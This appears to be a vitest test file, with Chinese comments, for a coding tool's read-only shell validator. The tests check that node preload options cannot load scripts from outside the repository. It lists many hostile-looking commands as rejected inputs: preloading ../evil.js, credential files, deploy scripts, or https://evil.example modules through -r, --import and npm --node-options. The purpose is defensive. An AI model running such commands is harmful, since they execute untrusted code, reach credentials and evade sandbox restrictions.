/**
 * H4-01（潜伏，第六轮 review）：旁路只读 shell 把「预加载选项的值」当脚本、真脚本当普通参数。
 *
 * 机制（读码核实 + 真 node 22 实测）：`checkBypassRunScript` 取 `tokens.slice(1).find(t => !t.startsWith("-"))`
 * 当脚本。预加载选项（`-r` / `--require` / `--import` / `--loader` / `--experimental-loader` / `--test-reporter`）
 * 的值既是它后面的 token（空格分隔），也可能粘在 `=` 后面：
 *   ① `node -r ./scripts/pre.js ../outside/evil.js`：`./scripts/pre.js` 被当成脚本、过了钳制，真正的脚本 `../outside/evil.js`
 *      成了「普通参数」没人看（真 node 实测：预加载 + 仓外脚本都被执行）；
 *   ② `node --require=/tmp/evil.js scripts/ok.js`：`--require=…` 以 `-` 开头被整体跳过，预加载目标没有任何
 *      工作目录钳制 / 凭据文件 / 发布脚本名检查（真 node 实测：`--require=<任意路径>` 会执行该文件）。
 * 当前没有调用方传 readOnly: true，所以是潜伏的；趁没人接线先补。
 *
 * 钉三件事：
 *   A. 预加载值（含 `=` 形态、`file:` URL、npm 的 `--node-options` 里的预加载）一律过路径钳制 / 凭据文件 / 发布脚本名检查；
 *      预加载之后真正的脚本操作数也要照常校验；
 *   B. 既有放行行为不变：仓内预加载 + 仓内脚本、包名预加载、脚本自己的参数（argv 不管）；
 *   C. 非 node 解释器 / 包管理器里的 `-r`（bash 的 restricted、pnpm 的 recursive）不被当成预加载误伤。
 *
 * 全程只做纯函数校验（不 spawn、不碰网）；被引用的仓外路径只是字符串、不会被执行。
 */
import { mkdtempSync, promises as fs } from "node:fs";
import os from "node:os";
import path from "node:path";
import { pathToFileURL } from "node:url";
import { describe, expect, it } from "vitest";

const TMP_ROOT = mkdtempSync(path.join(os.tmpdir(), "fe-preload-path-"));
process.env.FLOWSHIP_DATA_DIR = path.join(TMP_ROOT, "data");
const CWD = path.join(TMP_ROOT, "work");
await fs.mkdir(path.join(TMP_ROOT, "data"), { recursive: true });
await fs.mkdir(path.join(CWD, "scripts"), { recursive: true });

const { validateReadonlyShellCommand } = await import("@/lib/server/pi-coding-tools");

const check = (command: string) =>
  validateReadonlyShellCommand(CWD, command, undefined, undefined);

/** 仓外路径（只是字符串，不会被执行） */
const OUT_ABS = path.join(TMP_ROOT, "outside", "evil.js");
const OUT_URL = pathToFileURL(path.join(TMP_ROOT, "outside", "evil.mjs")).href;
const IN_ABS = path.join(CWD, "scripts", "pre.mjs");
const IN_URL = pathToFileURL(IN_ABS).href;

describe("A1 · 预加载在仓内、真脚本在仓外：真脚本不能被预加载的值顶替成「第一个非 flag 参数」", () => {
  const REJECT: Array<[string, string]> = [
    ["-r 仓内 + 相对仓外脚本", "node -r ./scripts/pre.js ../outside/evil.js"],
    ["--require 空格 + 绝对仓外脚本", `node --require ./scripts/pre.js ${OUT_ABS}`],
    ["--import 空格 + 相对仓外脚本", "node --import ./scripts/pre.mjs ../evil.mjs"],
    ["--loader 空格 + 仓外脚本", "node --loader ./scripts/hooks.mjs ../evil.js"],
    ["--experimental-loader 空格 + 仓外脚本", "node --experimental-loader ./scripts/hooks.mjs ../evil.js"],
    ["两个预加载 + 仓外脚本", "node -r ./scripts/a.js --import ./scripts/b.mjs ../evil.js"],
    ["--require= 等号形态 + 仓外脚本", "node --require=./scripts/pre.js ../evil.js"],
    ["--import= 等号形态 + 仓外脚本", "node --import=./scripts/pre.mjs ../evil.mjs"],
    ["预加载 + 脚本是凭据文件名", "node -r ./scripts/pre.js ./company-env.json"],
    ["预加载 + 脚本是发布脚本名", "node -r ./scripts/pre.js ./scripts/deploy.js"],
    ["预加载之后根本没有脚本操作数（值不能兼任脚本）", "node -r ./scripts/pre.js"],
    ["--import 之后根本没有脚本操作数", "node --import ./scripts/pre.mjs"],
  ];

  it.each(REJECT)("%s", (_desc, cmd) => {
    const verdict = check(cmd);
    expect(verdict.ok, `${cmd} 不该放行`).toBe(false);
    expect(verdict.reason ?? "", cmd).toContain("旁路只读");
  });
});

describe("A2 · 预加载目标本身必须钳在工作目录内、不碰凭据文件 / 发布脚本名", () => {
  const REJECT: Array<[string, string]> = [
    // 仓外：绝对 / 相对 / file: URL
    ["--require= 绝对仓外路径", `node --require=${OUT_ABS} scripts/ok.js`],
    ["--require= 相对仓外路径", "node --require=../evil.js scripts/ok.js"],
    ["--require= 越界的 ./a/../../x", "node --require=./a/../../evil.js scripts/ok.js"],
    ["-r 空格 + 仓外绝对路径", `node -r ${OUT_ABS} scripts/ok.js`],
    ["--import= 绝对仓外路径", `node --import=${OUT_ABS} scripts/ok.js`],
    ["--import= file: URL 仓外（真 node 实测会加载）", `node --import=${OUT_URL} scripts/ok.js`],
    ["--import 空格 + file: URL 仓外", `node --import ${OUT_URL} scripts/ok.js`],
    ["--loader= 仓外", `node --loader=${OUT_ABS} scripts/ok.js`],
    ["--experimental-loader= 仓外", `node --experimental-loader=${OUT_URL} scripts/ok.js`],
    ["--experimental_loader=（下划线，node 同样认）仓外", "node --experimental_loader=../x.mjs scripts/ok.js"],
    ["--test-reporter= 仓外", `node --test --test-reporter=${OUT_ABS} scripts/ok.js`],
    ["--test_reporter（下划线）空格 + 仓外", "node --test --test_reporter ../rep.mjs scripts/ok.js"],
    ["选项排在脚本之后（拿不准归 node 还是脚本，沿用「宁可拒」）", `node scripts/ok.js --require=${OUT_ABS}`],
    // file: URL 的畸形 / 非本机主机
    ["file: URL 带非本机主机", "node --import=file://evilhost/share/x.mjs scripts/ok.js"],
    ["file: URL 里的 %2F（解码后会换目录层级）", "node --import=file:///a%2F..%2F..%2Fx.mjs scripts/ok.js"],
    // 非 file / node 的 URL scheme：node 不会加载，但「不是仓内文件」就不放
    ["--import= https URL", "node --import=https://evil.example/x.mjs scripts/ok.js"],
    ["--import 空格 + http URL", "node --import http://evil.example/x.mjs scripts/ok.js"],
    // ~ / 变量展开：校验时看到的与 shell 展开后的对不上
    ["--require= ~ 开头", "node --require=~/evil.js scripts/ok.js"],
    ["-r 空格 + ~ 开头", "node -r ~/evil.js scripts/ok.js"],
    ["--require= 双引号里的 $HOME（双引号内 shell 照样展开）", 'node --require="$HOME/evil.js" scripts/ok.js'],
    ["--import= 双引号里的 ${X}", 'node --import="./${X}.mjs" scripts/ok.js'],
    ["--require= 单引号里的 $ 也拒（脚本路径同口径：出现 $ 一律拒）", "node --require='./$x.js' scripts/ok.js"],
    // 凭据文件
    ["--require= company-env.json", "node --require=./company-env.json scripts/ok.js"],
    ["--import= company-env.json（任意目录同名即拦）", "node --import=./scripts/company-env.json scripts/ok.js"],
    ["-r 空格 + company-env.json 绝对路径", `node -r ${path.join(CWD, "company-env.json")} scripts/ok.js`],
    // 发布 / 上线类脚本名
    ["--import= deploy 脚本名", "node --import=./scripts/deploy-hook.mjs scripts/ok.js"],
    ["--require= release 脚本名", "node --require=./scripts/release.js scripts/ok.js"],
    ["--loader= publish 脚本名", "node --loader=./scripts/publish.mjs scripts/ok.js"],
    // 值缺失
    ["--require= 空值", "node --require= scripts/ok.js"],
    ["--import 末尾没有值", "node scripts/ok.js --import"],
  ];

  it.each(REJECT)("%s", (_desc, cmd) => {
    const verdict = check(cmd);
    expect(verdict.ok, `${cmd} 不该放行`).toBe(false);
    expect(verdict.reason ?? "", cmd).toContain("旁路只读");
  });

  it("拒绝文案点明是预加载（便于模型改写法）", () => {
    const verdict = check(`node --require=${OUT_ABS} scripts/ok.js`);
    expect(verdict.ok).toBe(false);
    expect(verdict.reason ?? "").toContain("预加载");
  });
});

describe("A3 · npm / pnpm 的 --node-options 里的预加载（值是整串 NODE_OPTIONS，同样要钳制）", () => {
  const REJECT: Array<[string, string]> = [
    ["空格分隔的 --require 指向仓外", `npm test --node-options "--require ${OUT_ABS}"`],
    ["等号形态的 --node-options=--import=仓外相对路径", "npm run test --node-options=--import=../evil.mjs"],
    ["--node-options 里 --require= 仓外", `npm test --node-options="--require=${OUT_ABS}"`],
    ["--node-options 里 -r 仓外", `npm run test --node-options="-r ${OUT_ABS}"`],
    ["--node-options 里 file: URL 仓外", `npm test --node-options="--import=${OUT_URL}"`],
    ["--node-options 里别的选项之后跟仓外预加载", `npm test --node-options="--max-old-space-size=512 --require ${OUT_ABS}"`],
    ["--node-options 里预加载是发布脚本名", "npm test --node-options=--require=./scripts/deploy.js"],
    ["--node-options 里预加载是凭据文件", "npm test --node-options=--require=./company-env.json"],
    ["--node-options 值里的路径带内层引号（NODE_OPTIONS 会剥引号）", `npm test --node-options='--require "${OUT_ABS}"'`],
    ["--node-options 值里内层引号没收尾（切不出来 = 拿不准，宁可拒）", `npm test --node-options='--require "${OUT_ABS}'`],
    ["pnpm 同样（拿不准归谁就宁可拒）", `pnpm run test --node-options=--import=${OUT_ABS}`],
    ["--node-options 在动词之前", `npm --node-options=--require=${OUT_ABS} run test`],
  ];

  it.each(REJECT)("%s", (_desc, cmd) => {
    const verdict = check(cmd);
    expect(verdict.ok, `${cmd} 不该放行`).toBe(false);
    expect(verdict.reason ?? "", cmd).toContain("旁路只读");
  });
});

describe("B · 既有放行行为不变（仓内预加载 + 仓内脚本、包名预加载、脚本自己的参数）", () => {
  const ACCEPT: Array<[string, string]> = [
    ["普通脚本", "node scripts/ok.js"],
    ["-r 仓内 + 仓内脚本", "node -r ./scripts/pre.js scripts/ok.js"],
    ["--require 空格仓内 + 仓内脚本", "node --require ./scripts/pre.js scripts/ok.js"],
    ["--require= 仓内", "node --require=./scripts/pre.js scripts/ok.js"],
    ["--import 仓内", "node --import ./scripts/pre.mjs scripts/ok.js"],
    ["--import= 仓内", "node --import=./scripts/pre.mjs scripts/ok.js"],
    ["多个预加载都在仓内", "node -r ./scripts/a.js --import ./scripts/b.mjs --loader ./scripts/c.mjs scripts/ok.js"],
    ["预加载仓内绝对路径", `node --import ${IN_ABS} scripts/ok.js`],
    ["预加载 file: URL 在仓内", `node --import=${IN_URL} scripts/ok.js`],
    ["预加载带 .. 但归一化后仍在仓内", "node --require=./scripts/../scripts/pre.js scripts/ok.js"],
    ["预加载包名", "node --import tsx scripts/ok.js"],
    ["预加载包名带子路径", "node -r dotenv/config scripts/ok.js"],
    ["预加载 scoped 包名", "node --import @babel/register scripts/ok.js"],
    ["预加载 node: 内置模块", "node --import node:module scripts/ok.js"],
    ["--test-reporter 内置名", "node --test --test-reporter=spec scripts/ok.js"],
    ["--test-reporter 仓内文件", "node --test --test-reporter ./scripts/reporter.mjs scripts/ok.js"],
    ["预加载值带引号", 'node --import "./scripts/pre.mjs" scripts/ok.js'],
    ["脚本自己的参数里有仓外路径（argv 不管，沿用既有口径）", "node scripts/ok.js /tmp/data.txt ../other"],
    ["预加载 + 脚本自己的 flag / 参数", "node --import ./scripts/pre.mjs scripts/ok.js --port 3000"],
    ["预加载值恰好叫 ok.js（仓内、不是发布脚本名）", "node -r ./scripts/ok.js scripts/main.js"],
    ["npm --node-options 只带普通选项", "npm run test --node-options=--max-old-space-size=4096"],
    ["npm --node-options 里预加载仓内文件", "npm test --node-options=--import=./scripts/pre.mjs"],
    ["npm --node-options 里预加载仓内文件（空格 + 引号）", 'npm test --node-options "--require ./scripts/pre.js --max-old-space-size=512"'],
    ["npm --node-options 里预加载包名", 'npm test --node-options="--import tsx"'],
    ["npm test", "npm test"],
  ];

  it.each(ACCEPT)("%s", (_desc, cmd) => {
    const verdict = check(cmd);
    expect(verdict.ok, `${cmd} → ${verdict.reason ?? ""}`).toBe(true);
  });
});

describe("C · 别的程序里的 `-r` 不是 node 预加载（不能被误当预加载而误伤）", () => {
  it.each([
    ["bash -r（restricted shell）+ 仓内脚本", "bash -r scripts/ok.sh"],
    ["sh -r + 仓内脚本", "sh -r scripts/ok.sh"],
    ["pnpm -r（recursive）run test", "pnpm -r run test"],
    ["pnpm -r test", "pnpm -r test"],
  ])("放行：%s", (_desc, cmd) => {
    const verdict = check(cmd);
    expect(verdict.ok, `${cmd} → ${verdict.reason ?? ""}`).toBe(true);
  });

  it("bash -r 之后的脚本仍要钳制（不因放行 -r 而放过仓外脚本）", () => {
    expect(check("bash -r ../outside/ok.sh").ok).toBe(false);
  });
});
